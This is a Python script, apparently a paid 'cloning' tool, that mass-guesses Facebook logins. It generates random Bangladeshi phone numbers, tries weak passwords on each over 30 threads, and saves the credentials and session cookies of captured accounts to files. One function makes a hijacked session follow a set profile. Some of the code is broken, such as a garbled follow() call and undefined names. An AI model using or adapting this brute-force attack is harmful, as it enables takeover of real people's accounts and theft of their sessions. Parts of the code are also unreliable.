#-----------------[ IMPORT-MODULE ]-------------------
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()
#os.system("pkg install espeak")



from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass


#---------------------------------MAIN>MENU---------------------------------#
import os
import os
import sys
import time
import requests
import uuid
os.system('git pull')
#os.system("pkg install espeak")

def o():
    os.system('clear')
    print(logo)
    print("\033[1;92m[\033[1;92m\033[1;34mA\033[1;92m] RANDOM NUMBER GREEN CLONING \x1b[38;5;208m[ONLY OK]")
    CYBER =input("\033[1;92m[\033[1;34m➢]\033[1;92mCHOOSE : ")
    if CYBER == 'A':
    	C1()
    if me in ["1", "01","11","A","a"]:
	  # os.system('clear')
        None('\n\x1b[1;31mEXIT\x1b[0;97m')
        



import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

#------------------APK<>CHECKER-------------------#    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        #print(f'\033[1;91m%s[%s!%s] %sNot Found Active Apk%s  '%(N,M,N,M,N))
    #else:
        #print(f'\r[🔥] %s \x1b[1;95m Your Active Apps     :{GREEN}'%(GREEN))
        for i in range(len(game)):
            print(f"\033[\033[1;92m[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\033[1;96m%s[%s!%s] %sNot Found Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🔥] %s \x1b[1;95m  Your Expired Apps     :{RED}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
            
            

 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class cyber:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.0000)
            

#-------------------COLOR----------------#
RED = '\x1b[38;5;208m'
WHITE = '\033[1;92m'
GREEN = '\033[\033[1;92m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[38;5;46m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]

gg = random.choice(my_color)
bi = random.choice([P,M,K,B,U,O,N,H])
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open fb://group/1885398221816745?ref=share&mibextid=NSMWBT')
os.system('clear')
print('\x1b[1;32m             WELCOME TO SAMIR NEW PAID TOOLS  \033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●')
time.sleep(1)
os.system('xdg-open https://wa.me/+8801324313100')
import getpass

attemps = 0

while attemps < 12345677901:
    username = input('Enter username: ')
    password = input('Enter password: ')

    if username == 'KING' and password == 'QUEEN':
        print('You have successfully logged in.')
        break
    else:
        print('\033[1;35mINCORRECT THIS TOOLS IS PAID PLZ CONTACT WHATSAPP; +8801324313100')
        attemps += 1
        continue
os.system('clear')
os.system('xdg-open fb://group/1885398221816745?ref=share&mibextid=NSMWBT')
#-------------------mylover-------------------#
logo= """\033[1;92m
███    ███ ██████     ███████  █████  ███    ███ ██ ██████  
████  ████ ██   ██    ██      ██   ██ ████  ████ ██ ██   ██ 
██ ████ ██ ██████     ███████ ███████ ██ ████ ██ ██ ██████  
██  ██  ██ ██   ██         ██ ██   ██ ██  ██  ██ ██ ██   ██ 
██      ██ ██   ██ ██ ███████ ██   ██ ██      ██ ██ ██   ██ 

\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SAMIR TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PREMIUM
\033[1;32m[-] VERSION   :\033[1;32m 3.0
\033[1;32m[-] AUTHOR    :\033[1;32m SADMAN SAMIR SNIGDHO 
\033[1;32m[-] GITHUB    :\033[1;32m SAMIR-CYBER-143
\033[1;32m[-] FACEBOOK  :\033[1;32m SNIGDHO AFRIDI
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS SAMIR BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
#os.system('espeak -a 300 " WELLCOME   TO THE   SAMIR COMMAND"')



try:
    print("\033[\033[1;92m\nTOOL UPDATE SUCCESSFUL\n")
    time.sleep(2)
    o()
    print("\033[1;91m\nYOUR DEVICE IS NOT SUPPORTED!\n")
    o()
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mPROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN\033[0;92m')
#os.system('espeak -a 300 " TOOL UPDATE SUCCESSFUL"')

loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions

#User agents
ugen2=[]
ugen=['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0.3 Safari/605.1.15','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Saler/1.0.0 (random_id=abcdefg1234567; feature1=true; feature2=false) Chrome/94.0.4606.81 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Saler/1.0.0 Chrome/94.0.4606.81 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 (Chrome on Windows)',' Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 (Safari on iPhone)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/93.0.961.47 (Edge on Windows)']
    
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
lin= 40* '-'

def C1():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    os.system('xdg-open fb://group/1885398221816745?ref=share&mibextid=NSMWBT')
    print(logo)
    #os.system('espeak -a 300 " PLEAS TYP YOUR NAME"')
    print("\033[1;92mWHAT IS YOUR NAME?")
    name=input("\033[1;92mUSER NAME : \033[1;92m")
    os.system("clear")
    os.system('xdg-open fb://group/1885398221816745?ref=share&mibextid=NSMWBT')
    print(logo)
    print('ENTER YOUR COUNTRY CODE')
    #os.system('espeak -a 300 " PLEACE TYP YOUR SIM CODE"')
    print('==============================================')
    print('[BD CODE] \033[1;92m> \033[1;92m017 - 019 - 018 - 015-016 - 013 - 014 ')
    print('==============================================')
    code = input('\033[1;92mCHOOSE YOUR COUNTRY CODE : ')
    os.system('clear')
    print(logo)
    #os.system('espeak -a 300 " TYP YOUR CRACKED LIMITE"')
    limit = int(input('\033[1;92m[●]EXAMPLE: 3000, 5000, 15000, 20000\n\033[1;92mCHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as CYBER:
        clear()
        tl = str(len(user))
        ip = requests.get("https://api.ipify.org").text
        print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
        print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCRACK ID       \033[1;34m: \033[0;97m"+tl+" ")
        print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSIM CODE       \033[1;34m: \033[0;97m"+code)
        print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{ha}/{bu}/{ta} ~ {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f"==============================================  ")
        print ('')
        for love  in user:
            pwx = [love ,love [2:],love [1:],code+love ,code+love [:3],'bangladesh','ilove you','freefire']
            uid = code+love 
            CYBER.submit(rcrack,uid,pwx,tl)
    print(' CRACK PROCESS HAS BEEN COMPLETED ')

agents=[]

def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents 
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            bi = random.choice([P,M,K,B,U,O,N,H])
            session = requests.Session()       
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
            'method': 'POST',
            'path': '/login/?li=WZf4Y-5ptvqkGhzX8fnGGoQo&e=1348029&shbl=1&refsrc=deprecated&_rdr',
            'scheme': 'https',    
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'origin': 'https://p.facebook.com',
            'referer': 'https://p.facebook.com/',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="108", "Google Chrome";v="108"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://p.facebook.com/login/?li=WZf4Y-5ptvqkGhzX8fnGGoQo&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[\033[1;92m=====================\x1b[38;5;208m========================= ')
                print ('')
                print('\033[1;93m [\033[1;96mSAMIR-OK🌻\033[1;93m]\033[1;91m = \033[1;96m\033[1;92m' +cid+' | '+ps+'\033[1;91m = \033[1;96m '+tahunng(cid))
                print ('\033[1;93m [\033[1;96mCOOKIE\033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
               # print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
                #cek_apk(session,coki)
                open('/sdcard/SAMIR-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break 
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
              #  print('\033[1;96m[CYBER.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
               # print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
                open('/sdcard/SAMIR-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        #sys.stdout.write('\r%s[𝙲𝚛𝚎𝚊𝚔𝚒𝚗𝚐]%s/%s][OK-%s]\033[1;92m[CP-%s]\r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.write('\r%s[SAMIR-KING💥]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),sys.stdout.flush()
	
    except:
     pass
o()